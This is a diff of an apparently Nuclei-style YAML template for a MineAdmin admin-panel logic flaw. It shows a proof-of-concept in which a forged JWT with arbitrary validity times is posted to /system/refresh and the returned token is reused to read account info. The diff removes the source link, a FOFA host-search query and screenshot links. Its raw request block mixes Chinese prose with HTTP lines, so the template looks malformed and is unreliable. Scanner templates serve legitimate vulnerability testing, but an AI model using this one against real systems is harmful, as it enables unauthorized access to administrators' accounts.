@@ -3,17 +3,12 @@ info:
   name: MineAdmin企业级后台管理系统逻辑缺陷漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gzcugqpgttddhtpz'
+  description: ''
   tags: other,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gzcugqpgttddhtpz
-    fofa: body="MineAdmin"
 http:
 - raw:
   - 'POC/EXP：构造的jwt（次处可任意构造生效及过期时间）
 
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774238223547-63d93b26-0027-4238-b284-b150195eac8e.png)
 
     POST /system/refresh HTTP/1.1
 
@@ -31,11 +26,8 @@ http:
 
     Accept-Language: zh_CN
 
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774238223972-68e902eb-e71f-42f1-9915-3ef8826b5a86.png)
 
-    POC/EXP：复制响应包的token，并发起请求查看info信息（也可查看其他信息此处不一一展示）
-
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774238224351-3ea608ae-84a1-4999-9201-a586ee70d38c.png)'
+    POC/EXP：复制响应包的token，并发起请求查看info信息（也可查看其他信息此处不一一展示）'
   redirects: false
   matchers:
   - status:
